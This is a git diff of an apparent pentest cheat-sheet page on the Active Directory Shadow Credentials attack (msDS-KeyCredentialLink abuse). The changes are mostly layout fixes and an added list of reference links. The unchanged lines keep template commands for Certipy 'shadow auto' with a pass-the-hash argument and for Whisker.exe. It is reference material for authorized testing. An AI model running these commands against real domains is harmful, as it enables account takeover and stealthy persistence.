@@ -7,9 +7,11 @@ Check bloodhound sudgestions to know if this attack vector is available in your 
 #### What, when and who:
 The Shadow Credentials attack was discovered and presented in 2022 by Elad Shamir and Michael Grafnetter. They revealed the technique during a security research talk, showcasing how attackers can abuse the msDS-KeyCredentialLink attribute to achieve stealthy persistence in Active Directory environments using certificate-based authentication.
 
-### From Linux (externally, RECOMMENDED):
+<br>
+
 ____________________________________________________
 
+### From Linux (externally, RECOMMENDED):
 
 #### With Certipy, (RECOMMENDED):
 
@@ -21,6 +23,7 @@ ____________________________________________________
 
 ` < kerberos sync clock command > ; certipy shadow auto -u <user you control>@<domain> -hashes :<your user NT hash here> -account <target user> `
 
+<br>
 
 #### With pywisker:
 
@@ -44,9 +47,9 @@ ____________________________________________________
 
 <br>
 
-### Abusing SHADOW CREDENTIALS from Windows (internally):
-______________________________________________________
+____________________________________________________
 
+### Abusing SHADOW CREDENTIALS from Windows (internally):
 
 #### With whisker.exe:
 
@@ -61,5 +64,13 @@ ______________________________________________________
 
  You can also remove targets from msDS-KeyCredentialLink
   ` ./Whisker.exe remove /target:<target user> `
+
+<br>
+
+### Articles:
+
+https://www.hackingarticles.in/shadow-credentials-attack/
+https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials
+https://bloodhound.specterops.io/resources/edges/add-key-credential-link
 
 
